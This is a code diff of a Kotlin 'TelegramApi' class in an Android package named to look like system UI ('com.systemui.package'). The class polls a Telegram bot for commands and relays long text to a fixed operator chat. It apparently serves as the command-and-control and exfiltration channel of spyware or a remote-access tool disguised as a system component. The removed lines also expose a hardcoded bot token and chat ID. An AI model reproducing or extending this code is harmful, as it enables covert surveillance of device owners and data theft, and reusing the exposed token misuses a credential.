@@ -1,77 +1,97 @@
 package com.systemui.package
 
+import android.util.Log
+import com.google.gson.Gson
+import com.google.gson.JsonObject
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.withContext
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
-import okhttp3.RequestBody
-import okhttp3.MediaType.Companion.toMediaType
-import org.json.JSONObject
-import java.io.IOException
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.util.concurrent.TimeUnit
 
 object TelegramApi {
-    private const val BOT_TOKEN = "8697419498:AAFUkgi0_Jft2lpC5M5dWsM2rpVhIeYc91Q"
-    private const val CHAT_ID = "8036939276"
-    private const val BASE_URL = "https://api.telegram.org/bot$BOT_TOKEN"
+    private const val TAG = "DeviceRelay"
+    private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
+    private val gson = Gson()
 
-    private val client = OkHttpClient()
+    data class Update(val updateId: Long, val chatId: String, val text: String)
 
-    data class UpdateResponse(val ok: Boolean, val result: List<Update>)
-    data class Update(val update_id: Int, val message: Message?)
-    data class Message(val message_id: Int, val chat: Chat, val text: String?)
-    data class Chat(val id: Int)
+    suspend fun getUpdates(offset: Long): List<Update> = withContext(Dispatchers.IO) {
+        try {
+            val url = "${Config.GET_UPDATES_URL}?offset=$offset&timeout=2"
+            val req = Request.Builder().url(url).get().build()
 
-    data class SendMessageResponse(val ok: Boolean)
+            client.newCall(req).execute().use { res ->
+                if (!res.isSuccessful) { Log.e(TAG, "getUpdates failed: ${res.code}"); return@withContext emptyList() }
+                val body = res.body?.string() ?: return@withContext emptyList()
+                val json = gson.fromJson(body, JsonObject::class.java)
+                if (!json.has("result")) return@withContext emptyList()
 
-    fun getUpdates(offset: Int): UpdateResponse {
-        val url = "$BASE_URL/getUpdates?offset=$offset&limit=100&timeout=30"
-        val request = Request.Builder().url(url).build()
+                val results = json.getAsJsonArray("result")
+                val updates = mutableListOf<Update>()
 
-        client.newCall(request).execute().use { response ->
-            if (!response.isSuccessful) throw IOException("Unexpected code $response")
-
-            val body = response.body?.string() ?: throw IOException("Empty response body")
-            val json = JSONObject(body)
-
-            return UpdateResponse(
-                ok = json.getBoolean("ok"),
-                result = json.getJSONArray("result").let { arr ->
-                    List(arr.length()) { i ->
-                        val obj = arr.getJSONObject(i)
-                        Update(
-                            update_id = obj.getInt("update_id"),
-                            message = obj.optJSONObject("message")?.let { msgObj ->
-                                Message(
-                                    message_id = msgObj.getInt("message_id"),
-                                    chat = Chat(msgObj.getJSONObject("chat").getInt("id")),
-                                    text = msgObj.optString("text", null)
-                                )
-                            }
-                        )
-                    }
+                for (e in results) {
+                    val o = e.asJsonObject
+                    val uId = o.get("update_id")?.asLong ?: continue
+                    val msg = o.getAsJsonObject("message") ?: continue
+                    val chat = msg.getAsJsonObject("chat") ?: continue
+                    val cId = chat.get("id")?.asString ?: continue
+                    val txt = msg.get("text")?.asString ?: continue
+                    updates.add(Update(uId, cId, txt))
                 }
-            )
-        }
+                updates
+            }
+        } catch (e: Exception) { Log.e(TAG, "getUpdates error", e); emptyList() }
     }
 
-    fun sendMessage(chatId: Int, text: String): Boolean {
-        val json = JSONObject().apply {
-            put("chat_id", chatId)
-            put("text", text)
+    suspend fun sendMessage(text: String): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val jsonBody = gson.toJson(mapOf("chat_id" to Config.CHAT_ID, "text" to text, "parse_mode" to "HTML"))
+            val body = jsonBody.toRequestBody("application/json".toMediaType())
+            val req = Request.Builder().url(Config.BASE_URL).post(body).build()
+
+            client.newCall(req).execute().use { res ->
+                if (!res.isSuccessful) { Log.e(TAG, "sendMessage failed: ${res.code}"); delay(2000); retrySend(text) }
+                else true
+            }
+        } catch (e: Exception) { Log.e(TAG, "sendMessage error", e); false }
+    }
+
+    private suspend fun retrySend(text: String): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val jsonBody = gson.toJson(mapOf("chat_id" to Config.CHAT_ID, "text" to text, "parse_mode" to "HTML"))
+            val body = jsonBody.toRequestBody("application/json".toMediaType())
+            val req = Request.Builder().url(Config.BASE_URL).post(body).build()
+            client.newCall(req).execute().use { it.isSuccessful }
+        } catch (e: Exception) { Log.e(TAG, "retry error", e); false }
+    }
+
+    suspend fun sendLongMessage(text: String) {
+        if (text.length <= Config.MAX_MSG_LENGTH) { sendMessage(text); return }
+        val chunks = splitMessage(text)
+        for (chunk in chunks) { sendMessage(chunk); delay(300) }
+    }
+
+    private fun splitMessage(text: String): List<String> {
+        val chunks = mutableListOf<String>()
+        val lines = text.split("\n")
+        val current = StringBuilder()
+        for (line in lines) {
+            if (current.length + line.length + 1 > Config.MAX_MSG_LENGTH) {
+                if (current.isNotEmpty()) { chunks.add(current.toString()); current.clear() }
+                if (line.length > Config.MAX_MSG_LENGTH) {
+                    var i = 0
+                    while (i < line.length) {
+                        chunks.add(line.substring(i, minOf(i + Config.MAX_MSG_LENGTH, line.length)))
+                        i += Config.MAX_MSG_LENGTH
+                    }
+                } else { current.append(line) }
+            } else { if (current.isNotEmpty()) current.append("\n"); current.append(line) }
         }
-
-        val body = RequestBody.create(
-            "application/json".toMediaType(),
-            json.toString()
-        )
-
-        val request = Request.Builder()
-            .url("$BASE_URL/sendMessage")
-            .post(body)
-            .build()
-
-        client.newCall(request).execute().use { response ->
-            if (!response.isSuccessful) return false
-            val bodyStr = response.body?.string() ?: return false
-            return JSONObject(bodyStr).getBoolean("ok")
-        }
+        if (current.isNotEmpty()) chunks.add(current.toString())
+        return chunks
     }
 }
